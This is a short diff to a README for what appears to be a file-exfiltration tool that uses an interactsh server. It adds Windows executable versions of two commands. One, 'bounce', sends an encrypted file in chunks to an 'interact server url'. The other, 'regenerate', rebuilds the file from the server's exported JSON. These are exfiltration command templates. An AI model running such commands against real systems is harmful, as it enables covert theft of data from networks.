@@ -16,6 +16,9 @@ Example:
 ```
 go run bounce.go -f <filename> -p <password> -u <UUID> -e <interact server url> -v
 ```
+```
+.\bounce.exe -f <filename> -p <password> -u <UUID> -e <interact server url> -v
+```
 
 ### Regenerate.go
 This script reads the JSON output from your interactsh exfil server, processes and reassembles the chunks and does the reverse of decoding, decrypting, and finally outputting the file.
@@ -23,6 +26,9 @@ This script reads the JSON output from your interactsh exfil server, processes a
 Example:
 ```
 go run regenerate.go -i <exported.json> -o <outputfile> -p <password> -u <UUID> -v
+```
+```
+.\regenerate.exe -i <exported.json> -o <outputfile> -p <password> -u <UUID> -v
 ```
 
 ### Images
